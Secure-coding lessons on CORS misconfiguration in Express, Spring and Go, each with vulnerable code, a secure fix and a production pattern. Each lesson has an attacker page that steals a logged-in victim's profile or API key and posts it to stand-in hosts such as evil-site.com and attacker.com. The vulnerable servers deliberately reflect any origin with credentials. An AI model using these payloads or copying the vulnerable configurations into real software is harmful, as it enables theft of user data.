CORS (Cross-Origin Resource Sharing) configuration is a critical security control that's frequently misconfigured. A permissive CORS policy can allow attackers to steal data from authenticated users by making requests from malicious websites.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// DANGEROUS: Allows any origin to access the API
app.use(cors());

// Even worse: Reflects the Origin header back as allowed
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// Sensitive endpoint that returns user data
app.get('/api/user/profile', (req, res) => {
  // Returns sensitive data to any origin!
  const userData = getUserFromSession(req);
  res.json(userData);
});

app.get('/api/admin/users', (req, res) => {
  // Admin endpoint accessible cross-origin with credentials
  res.json(getAllUsers());
});

app.listen(3000);
```

**Attack Payload**:
```html
<!-- Attacker's website: https://evil-site.com/steal.html -->
<script>
// Steal victim's data when they visit attacker's site
fetch('https://vulnerable-api.com/api/user/profile', {
  credentials: 'include'  // Sends victim's session cookie
})
.then(response => response.json())
.then(data => {
  // Exfiltrate stolen data to attacker server
  fetch('https://evil-site.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

**Why This Is Dangerous**:
- Reflecting any Origin with `Access-Control-Allow-Credentials: true` allows any website to make authenticated requests
- Using `cors()` with no options defaults to `Access-Control-Allow-Origin: *` which blocks credentials but exposes public endpoints
- Attackers can steal session data, PII, and perform actions as the victim
- The `null` origin is particularly dangerous as it can be triggered from sandboxed iframes

**SECURE VERSION**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Define explicit allowlist of trusted origins
const allowedOrigins = [
  'https://myapp.com',
  'https://www.myapp.com',
  'https://admin.myapp.com'
];

// Add development origin only in non-production
if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:3000');
}

const corsOptions = {
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc.)
    // Only if explicitly needed and with additional auth checks
    if (!origin) {
      return callback(null, false);
    }

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`Blocked CORS request from: ${origin}`);
      callback(new Error('CORS policy violation'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400  // Cache preflight for 24 hours
};

app.use(cors(corsOptions));

// Sensitive endpoint now protected
app.get('/api/user/profile', (req, res) => {
  const userData = getUserFromSession(req);
  res.json(userData);
});

app.listen(3000);
```

**Key Security Controls**:
- **Explicit origin allowlist**: Only trusted domains can make cross-origin requests; never reflect or wildcard the Origin header
- **Environment-aware configuration**: Development origins only allowed in dev mode, preventing accidental production exposure
- **Reject null origins**: The `null` origin can be abused through sandboxed iframes and data URIs
- **Logging blocked requests**: Enables detection of reconnaissance or attack attempts

Managing dynamic CORS allowlists for multiple subdomains and partners requires careful implementation. You need pattern matching that's strict enough to prevent bypass attacks while being flexible enough for legitimate use cases.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const cors = require('cors');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

const app = express();

// Structured logging for security events
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Partner origins loaded from secure configuration
const getPartnerOrigins = () => {
  // In production, load from encrypted config or secrets manager
  return new Set([
    'https://partner-a.com',
    'https://api.partner-b.com',
    'https://secure.partner-c.org'
  ]);
};

// Strict subdomain validation - prevents bypass attacks
const isValidSubdomain = (origin) => {
  // CRITICAL: Use strict regex to prevent bypasses like:
  // - evil-myapp.com (prefix attack)
  // - myapp.com.evil.com (suffix attack)  
  // - myapp.com:evil.com (port confusion)

  const trustedDomains = [
    /^https:\/\/([a-z0-9-]+\.)?myapp\.com$/,
    /^https:\/\/([a-z0-9-]+\.)?mycompany\.io$/
  ];

  return trustedDomains.some(pattern => pattern.test(origin));
};

// CORS validation with multiple security layers
const validateOrigin = (origin, req) => {
  // Layer 1: Reject missing/null origins for credentialed requests
  if (!origin || origin === 'null') {
    securityLogger.warn({
      event: 'cors_null_origin',
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      path: req.path
    });
    return false;
  }

  // Layer 2: Check partner allowlist (exact match)
  const partnerOrigins = getPartnerOrigins();
  if (partnerOrigins.has(origin)) {
    return true;
  }

  // Layer 3: Validate subdomain pattern
  if (isValidSubdomain(origin)) {
    return true;
  }

  // Layer 4: Log and reject unknown origins
  securityLogger.warn({
    event: 'cors_blocked',
    origin: origin,
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    path: req.path,
    timestamp: new Date().toISOString()
  });

  return false;
};

const corsOptions = {
  origin: function(origin, callback) {
    // Access request object through closure (set in middleware)
    const req = this.req;

    if (validateOrigin(origin, req)) {
      callback(null, true);
    } else {
      callback(new Error('CORS policy: Origin not allowed'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
  maxAge: 600,  // 10 minute preflight cache
  optionsSuccessStatus: 204
};

// Middleware to attach request to cors context
app.use((req, res, next) => {
  corsOptions.req = req;
  next();
});

app.use(cors(corsOptions));

// Rate limiting per origin to prevent abuse
const originLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  keyGenerator: (req) => {
    return req.get('Origin') || req.ip;
  },
  handler: (req, res) => {
    securityLogger.warn({
      event: 'cors_rate_limit',
      origin: req.get('Origin'),
      ip: req.ip
    });
    res.status(429).json({ error: 'Too many requests' });
  }
});

app.use('/api/', originLimiter);

// Additional security headers
app.use((req, res, next) => {
  // Prevent framing attacks
  res.setHeader('X-Frame-Options', 'DENY');
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Enable browser XSS protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

// Partner-specific endpoints with additional validation
app.get('/api/partner/data', (req, res) => {
  const origin = req.get('Origin');
  const partnerOrigins = getPartnerOrigins();

  // Double-check partner access at endpoint level
  if (!partnerOrigins.has(origin)) {
    securityLogger.error({
      event: 'unauthorized_partner_access',
      origin: origin,
      ip: req.ip
    });
    return res.status(403).json({ error: 'Partner access required' });
  }

  // Return partner-specific data
  res.json({ data: 'partner-specific-content' });
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Strict Regex Validation** - Prevents origin bypass attacks:
```javascript
// WRONG - vulnerable to evil-myapp.com
if (origin.includes('myapp.com')) { ... }

// CORRECT - anchored regex with protocol
const pattern = /^https:\/\/([a-z0-9-]+\.)?myapp\.com$/;
if (pattern.test(origin)) { ... }
```

2. **Layered Origin Checks** - Multiple validation stages:
```javascript
// Layer 1: Reject null/missing
// Layer 2: Check exact partner match
// Layer 3: Check subdomain pattern
// Layer 4: Deny by default
```

3. **Endpoint-Level Validation** - Defense in depth:
```javascript
// Don't rely only on CORS - validate at the endpoint too
app.get('/api/sensitive', (req, res) => {
  if (!isAuthorizedOrigin(req.get('Origin'))) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Handle request
});
```

**Additional Protections**:
- **Secrets Manager Integration**: Load partner allowlist from AWS Secrets Manager or HashiCorp Vault, not environment variables
- **Origin-specific rate limiting**: Prevent any single origin from overwhelming the API
- **Security headers**: X-Frame-Options, CSP, and X-Content-Type-Options provide additional browser-level protection
- **Audit logging**: All CORS decisions logged with origin, IP, path for incident response
- **Preflight caching**: Short maxAge (10 min) balances performance with security updates
- **Alert on anomalies**: Set up alerts for unusual patterns like repeated blocked origins or high volumes from new origins

CORS (Cross-Origin Resource Sharing) configuration is critical for security. A common mistake is allowing all origins, which completely defeats the same-origin policy and exposes your users to cross-site request attacks.

**VULNERABLE CODE**:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.Arrays;

@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
            .allowedOrigins("*")  // DANGEROUS: Allows ANY website
            .allowedMethods("*")  // DANGEROUS: Allows all HTTP methods
            .allowedHeaders("*")  // DANGEROUS: Allows all headers
            .allowCredentials(true);  // CRITICAL: Sends cookies to ANY origin
    }
}
```

**Attack Scenario**:
```html
<!-- Attacker's malicious website: evil-site.com -->
<script>
  // Victim visits this page while logged into your app
  fetch('https://your-api.com/api/user/profile', {
    credentials: 'include'  // Sends victim's session cookies
  })
  .then(response => response.json())
  .then(data => {
    // Steal victim's data
    fetch('https://evil-site.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

**Why This Is Dangerous**:
- `allowedOrigins("*")` permits any website to make requests to your API
- `allowCredentials(true)` with wildcard origin sends user's cookies with cross-origin requests
- Attackers can steal user data, perform actions as the user, or access sensitive API endpoints
- This bypasses browser's same-origin policy, the fundamental web security mechanism

**SECURE VERSION**:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.Arrays;
import java.util.List;

@Configuration
public class SecureCorsConfig implements WebMvcConfigurer {

    // Explicitly whitelist allowed origins
    private static final List<String> ALLOWED_ORIGINS = Arrays.asList(
        "https://app.yourcompany.com",
        "https://admin.yourcompany.com"
    );

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(ALLOWED_ORIGINS.toArray(new String[0]))
            .allowedMethods("GET", "POST", "PUT", "DELETE")  // Only needed methods
            .allowedHeaders("Authorization", "Content-Type", "X-Requested-With")
            .exposedHeaders("X-Request-Id")  // Only expose needed headers
            .allowCredentials(true)
            .maxAge(3600);  // Cache preflight for 1 hour
    }
}
```

**Key Security Controls**:
- **Explicit origin whitelist**: Only trusted domains can make cross-origin requests
- **Limited HTTP methods**: Only allow methods your API actually needs
- **Restricted headers**: Allow only specific headers, not wildcards
- **Path-specific mapping**: Apply CORS only to API paths that need it
- **Preflight caching**: Reduces OPTIONS requests while maintaining security

Great question! Environment-specific CORS and subdomain handling require careful configuration. Never use regex patterns that are too permissive, and always validate origins dynamically against an allowlist.

**PRODUCTION PATTERN**:

```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

import javax.servlet.http.HttpServletRequest;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;

@Configuration
public class ProductionCorsConfig {

    private static final Logger logger = LoggerFactory.getLogger(ProductionCorsConfig.class);
    private static final Logger securityAuditLog = LoggerFactory.getLogger("SECURITY_AUDIT");

    @Value("${cors.allowed-origins}")
    private List<String> allowedOrigins;

    @Value("${cors.allowed-subdomain-pattern:}")
    private String subdomainPattern;

    // Compiled pattern for subdomain matching (e.g., *.yourcompany.com)
    private Pattern compiledSubdomainPattern;

    // Set for O(1) origin lookup
    private Set<String> allowedOriginsSet;

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        // Initialize allowed origins set
        allowedOriginsSet = new HashSet<>(allowedOrigins);

        // Compile subdomain pattern if provided
        if (subdomainPattern != null && !subdomainPattern.isEmpty()) {
            // SECURE: Escape regex metacharacters and only allow safe subdomain pattern
            String safePattern = "^https://[a-zA-Z0-9-]+\\." + 
                Pattern.quote(subdomainPattern.replace("*.", "")) + "$";
            compiledSubdomainPattern = Pattern.compile(safePattern);
        }

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();

        CorsConfiguration config = new CorsConfiguration();

        // Use custom origin checker instead of static list
        config.setAllowedOriginPatterns(null);  // Disable pattern matching
        config.setAllowedOrigins(null);  // Use custom validation

        // Set allowed methods explicitly
        config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));

        // Set allowed headers explicitly
        config.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With",
            "X-CSRF-Token",
            "X-Request-ID"
        ));

        // Expose specific response headers
        config.setExposedHeaders(Arrays.asList(
            "X-Request-ID",
            "X-RateLimit-Remaining"
        ));

        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        source.registerCorsConfiguration("/api/**", config);

        return source;
    }

    @Bean
    public CorsFilter corsFilter() {
        return new CorsFilter(corsConfigurationSource()) {
            @Override
            protected boolean shouldNotFilter(HttpServletRequest request) {
                // Only apply CORS filter to API paths
                return !request.getRequestURI().startsWith("/api/");
            }
        };
    }

    /**
     * Validates if an origin is allowed - called by custom CORS processor
     */
    public boolean isOriginAllowed(String origin) {
        if (origin == null || origin.isEmpty()) {
            securityAuditLog.warn("CORS request with null/empty origin");
            return false;
        }

        // Normalize origin
        String normalizedOrigin = origin.toLowerCase().trim();

        // Check against explicit whitelist (O(1) lookup)
        if (allowedOriginsSet.contains(normalizedOrigin)) {
            logger.debug("Origin {} allowed via whitelist", normalizedOrigin);
            return true;
        }

        // Check subdomain pattern if configured
        if (compiledSubdomainPattern != null && 
            compiledSubdomainPattern.matcher(normalizedOrigin).matches()) {

            // Additional validation: ensure it's HTTPS
            if (!normalizedOrigin.startsWith("https://")) {
                securityAuditLog.warn("CORS subdomain match rejected - not HTTPS: {}", origin);
                return false;
            }

            logger.debug("Origin {} allowed via subdomain pattern", normalizedOrigin);
            return true;
        }

        // Log rejected origins for security monitoring
        securityAuditLog.warn("CORS origin rejected: {}", origin);
        return false;
    }
}
```

**Environment-Specific Configuration (application.yml)**:

```yaml
# application-development.yml
cors:
  allowed-origins:
    - http://localhost:3000
    - http://localhost:8080
  allowed-subdomain-pattern: ""

---
# application-staging.yml
cors:
  allowed-origins:
    - https://staging-app.yourcompany.com
    - https://staging-admin.yourcompany.com
  allowed-subdomain-pattern: "staging.yourcompany.com"

---
# application-production.yml
cors:
  allowed-origins:
    - https://app.yourcompany.com
    - https://admin.yourcompany.com
    - https://mobile.yourcompany.com
  allowed-subdomain-pattern: "yourcompany.com"
```

**Custom CORS Processor with Audit Logging**:

```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.DefaultCorsProcessor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Component
public class AuditingCorsProcessor extends DefaultCorsProcessor {

    private static final Logger securityAuditLog = LoggerFactory.getLogger("SECURITY_AUDIT");

    @Autowired
    private ProductionCorsConfig corsConfig;

    @Override
    public boolean processRequest(CorsConfiguration config, HttpServletRequest request,
                                   HttpServletResponse response) throws IOException {

        String origin = request.getHeader("Origin");
        String method = request.getMethod();
        String requestUri = request.getRequestURI();
        String clientIp = getClientIp(request);

        // Validate origin using our custom logic
        if (origin != null && !corsConfig.isOriginAllowed(origin)) {
            securityAuditLog.warn(
                "CORS_BLOCKED | ip={} | origin={} | method={} | uri={}",
                clientIp, origin, method, requestUri
            );
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            response.getWriter().write("{\"error\":\"Origin not allowed\"}");
            return false;
        }

        // Log successful CORS requests for monitoring
        if (origin != null) {
            securityAuditLog.info(
                "CORS_ALLOWED | ip={} | origin={} | method={} | uri={}",
                clientIp, origin, method, requestUri
            );

            // Set the validated origin in the response
            response.setHeader("Access-Control-Allow-Origin", origin);
        }

        return super.processRequest(config, request, response);
    }

    private String getClientIp(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}
```

**Defense in Depth Layers**:

1. **Origin Whitelist Validation**:
```java
// Never trust user input - validate against explicit list
private boolean validateOrigin(String origin) {
    // Use Set for O(1) lookup performance
    return origin != null && allowedOriginsSet.contains(origin.toLowerCase());
}
```

2. **CSRF Token Verification (supplement to CORS)**:
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .cors().and()
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringAntMatchers("/api/public/**")  // Only ignore truly public endpoints
            .and()
            .headers()
                .frameOptions().deny()  // Prevent clickjacking
                .contentSecurityPolicy("default-src 'self'");
    }
}
```

3. **Security Headers**:
```java
@Component
public class SecurityHeadersFilter implements Filter {

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) res;

        // Additional security headers
        response.setHeader("X-Content-Type-Options", "nosniff");
        response.setHeader("X-Frame-Options", "DENY");
        response.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

        chain.doFilter(req, res);
    }
}
```

**Additional Protections**:
- **Never reflect arbitrary origins**: Always validate against whitelist, never echo back unvalidated Origin header
- **Avoid regex pitfalls**: Patterns like `.*\.yourcompany\.com` can match `yourcompany.com.attacker.com` - use anchored patterns
- **Separate configurations**: Don't share CORS configs between public and authenticated endpoints
- **Monitor and alert**: Set up alerts for high volumes of rejected CORS requests
- **Regular audit**: Review allowed origins quarterly and remove unused entries

CORS misconfigurations are extremely dangerous because they can allow malicious websites to make authenticated requests to your API on behalf of your users. Let me show you a vulnerable pattern I see frequently, and then the secure approach.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/json"
	"net/http"
)

type User struct {
	ID       int    `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
	APIKey   string `json:"api_key"`
}

func enableCORS(w http.ResponseWriter, r *http.Request) {
	// VULNERABLE: Reflects any origin - allows all websites to access API
	origin := r.Header.Get("Origin")
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "*")
}

func getUserData(w http.ResponseWriter, r *http.Request) {
	enableCORS(w, r)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Get user from session (authenticated endpoint)
	user := User{
		ID:       1,
		Username: "victim",
		Email:    "victim@example.com",
		APIKey:   "sk_live_abc123secret",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	http.HandleFunc("/api/user", getUserData)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload** (hosted on attacker's website):
```html
<html>
<body>
<script>
fetch('https://vulnerable-api.com/api/user', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Steal API key and send to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      apiKey: data.api_key,
      email: data.email
    })
  });
});
</script>
</body>
</html>
```

**Why This Is Dangerous**:
- Reflecting the Origin header means ANY website can make authenticated requests to your API
- `Access-Control-Allow-Credentials: true` with wildcard origin allows cookies/sessions to be sent
- Attackers can steal sensitive data like API keys, personal information, or perform actions as the victim
- This completely bypasses Same-Origin Policy protections built into browsers

**SECURE VERSION**:

```go
package main

import (
	"encoding/json"
	"net/http"
	"strings"
)

type User struct {
	ID       int    `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
}

// Whitelist of allowed origins
var allowedOrigins = map[string]bool{
	"https://myapp.com":         true,
	"https://www.myapp.com":     true,
	"https://staging.myapp.com": true,
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")

		// Only allow whitelisted origins
		if allowedOrigins[origin] {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			w.Header().Set("Access-Control-Max-Age", "86400")
		}

		// Handle preflight
		if r.Method == "OPTIONS" {
			if !allowedOrigins[origin] {
				w.WriteHeader(http.StatusForbidden)
				return
			}
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func getUserData(w http.ResponseWriter, r *http.Request) {
	// Sensitive data - API key removed from response
	user := User{
		ID:       1,
		Username: "user",
		Email:    "user@example.com",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/user", getUserData)

	handler := corsMiddleware(mux)
	http.ListenAndServe(":8080", handler)
}
```

**Key Security Controls**:
- **Origin Whitelist**: Only explicitly allowed origins can make cross-origin requests with credentials
- **Explicit Header List**: Only specific headers are allowed, not `*` which would allow any header
- **No Sensitive Data in CORS Responses**: API keys should never be returned in responses accessible via CORS
- **Proper Preflight Handling**: OPTIONS requests are validated before allowing the actual request

Dynamic origin validation requires careful implementation to avoid regex bypass vulnerabilities. Here's a production-ready pattern with proper subdomain handling, monitoring, and defense in depth.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type CORSConfig struct {
	AllowedDomains    []string
	AllowedMethods    []string
	AllowedHeaders    []string
	ExposedHeaders    []string
	MaxAge            int
	AllowCredentials  bool
	EnableLogging     bool
}

type CORSMiddleware struct {
	config     CORSConfig
	logger     *slog.Logger
	violations *ViolationTracker
}

type ViolationTracker struct {
	mu        sync.RWMutex
	violations map[string]int
	threshold  int
}

func NewViolationTracker(threshold int) *ViolationTracker {
	return &ViolationTracker{
		violations: make(map[string]int),
		threshold:  threshold,
	}
}

func (vt *ViolationTracker) RecordViolation(origin string) bool {
	vt.mu.Lock()
	defer vt.mu.Unlock()

	vt.violations[origin]++
	return vt.violations[origin] >= vt.threshold
}

func (vt *ViolationTracker) GetViolationCount(origin string) int {
	vt.mu.RLock()
	defer vt.mu.RUnlock()
	return vt.violations[origin]
}

func NewCORSMiddleware(config CORSConfig) *CORSMiddleware {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))

	return &CORSMiddleware{
		config:     config,
		logger:     logger,
		violations: NewViolationTracker(10),
	}
}

// isOriginAllowed performs secure origin validation
func (cm *CORSMiddleware) isOriginAllowed(origin string) bool {
	if origin == "" {
		return false
	}

	// Parse origin to validate it's a proper URL
	parsedOrigin, err := url.Parse(origin)
	if err != nil {
		cm.logger.Warn("invalid origin format",
			slog.String("origin", origin),
			slog.String("error", err.Error()))
		return false
	}

	// Only allow HTTPS in production
	if os.Getenv("ENV") == "production" && parsedOrigin.Scheme != "https" {
		cm.logger.Warn("rejected non-HTTPS origin in production",
			slog.String("origin", origin))
		return false
	}

	host := strings.ToLower(parsedOrigin.Host)

	for _, allowedDomain := range cm.config.AllowedDomains {
		// Exact match
		if host == allowedDomain {
			return true
		}

		// Subdomain match (secure implementation)
		if strings.HasPrefix(allowedDomain, "*.") {
			baseDomain := allowedDomain[2:] // Remove "*."

			// Host must end with .baseDomain (not just baseDomain)
			// This prevents attacker.commyapp.com from matching *.myapp.com
			if strings.HasSuffix(host, "."+baseDomain) {
				// Ensure no path traversal or tricks in subdomain
				subdomain := strings.TrimSuffix(host, "."+baseDomain)
				if isValidSubdomain(subdomain) {
					return true
				}
			}
		}
	}

	return false
}

// isValidSubdomain prevents subdomain-based attacks
func isValidSubdomain(subdomain string) bool {
	// No empty subdomains
	if subdomain == "" {
		return false
	}

	// No path-like content
	if strings.Contains(subdomain, "/") {
		return false
	}

	// Only allow alphanumeric, hyphens, and dots for multi-level subdomains
	for _, c := range subdomain {
		if !((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}

	// No leading/trailing hyphens or dots
	if strings.HasPrefix(subdomain, "-") || strings.HasSuffix(subdomain, "-") ||
		strings.HasPrefix(subdomain, ".") || strings.HasSuffix(subdomain, ".") {
		return false
	}

	return true
}

func (cm *CORSMiddleware) Handler(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		requestID := r.Header.Get("X-Request-ID")
		if requestID == "" {
			requestID = fmt.Sprintf("%d", time.Now().UnixNano())
		}

		// Add request ID to context
		ctx := context.WithValue(r.Context(), "requestID", requestID)
		r = r.WithContext(ctx)

		// Always set Vary header to prevent cache poisoning
		w.Header().Set("Vary", "Origin")

		if cm.isOriginAllowed(origin) {
			w.Header().Set("Access-Control-Allow-Origin", origin)

			if cm.config.AllowCredentials {
				w.Header().Set("Access-Control-Allow-Credentials", "true")
			}

			if len(cm.config.ExposedHeaders) > 0 {
				w.Header().Set("Access-Control-Expose-Headers",
					strings.Join(cm.config.ExposedHeaders, ", "))
			}

			// Log successful CORS request
			if cm.config.EnableLogging {
				cm.logger.Info("cors_request_allowed",
					slog.String("request_id", requestID),
					slog.String("origin", origin),
					slog.String("method", r.Method),
					slog.String("path", r.URL.Path),
					slog.String("remote_addr", r.RemoteAddr))
			}
		} else if origin != "" {
			// Log CORS violation
			shouldAlert := cm.violations.RecordViolation(origin)

			cm.logger.Warn("cors_violation_detected",
				slog.String("request_id", requestID),
				slog.String("origin", origin),
				slog.String("method", r.Method),
				slog.String("path", r.URL.Path),
				slog.String("remote_addr", r.RemoteAddr),
				slog.String("user_agent", r.UserAgent()),
				slog.Int("violation_count", cm.violations.GetViolationCount(origin)),
				slog.Bool("alert_triggered", shouldAlert))

			if shouldAlert {
				// Trigger security alert (integrate with your alerting system)
				cm.triggerSecurityAlert(origin, r)
			}
		}

		// Handle preflight
		if r.Method == http.MethodOptions {
			if !cm.isOriginAllowed(origin) {
				w.WriteHeader(http.StatusForbidden)
				return
			}

			w.Header().Set("Access-Control-Allow-Methods",
				strings.Join(cm.config.AllowedMethods, ", "))
			w.Header().Set("Access-Control-Allow-Headers",
				strings.Join(cm.config.AllowedHeaders, ", "))
			w.Header().Set("Access-Control-Max-Age",
				fmt.Sprintf("%d", cm.config.MaxAge))

			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func (cm *CORSMiddleware) triggerSecurityAlert(origin string, r *http.Request) {
	// Integration point for security alerting (PagerDuty, Slack, SIEM)
	cm.logger.Error("security_alert_cors_abuse",
		slog.String("alert_type", "cors_abuse_threshold_exceeded"),
		slog.String("origin", origin),
		slog.String("remote_addr", r.RemoteAddr),
		slog.String("severity", "high"))
}

func getUserProfile(w http.ResponseWriter, r *http.Request) {
	// Only return non-sensitive data
	response := map[string]interface{}{
		"id":       1,
		"username": "user",
		"email":    "user@example.com",
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	json.NewEncoder(w).Encode(response)
}

func main() {
	config := CORSConfig{
		AllowedDomains: []string{
			"myapp.com",
			"www.myapp.com",
			"*.myapp.com", // Secure subdomain matching
		},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE"},
		AllowedHeaders:   []string{"Content-Type", "Authorization", "X-Request-ID"},
		ExposedHeaders:   []string{"X-Request-ID"},
		MaxAge:           86400,
		AllowCredentials: true,
		EnableLogging:    true,
	}

	// Add development origin only in non-production
	if os.Getenv("ENV") != "production" {
		config.AllowedDomains = append(config.AllowedDomains, "localhost:3000")
	}

	cors := NewCORSMiddleware(config)

	mux := http.NewServeMux()
	mux.HandleFunc("/api/user", getUserProfile)

	handler := cors.Handler(mux)

	server := &http.Server{
		Addr:         ":8080",
		Handler:      handler,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	fmt.Println("Server starting on :8080")
	server.ListenAndServe()
}
```

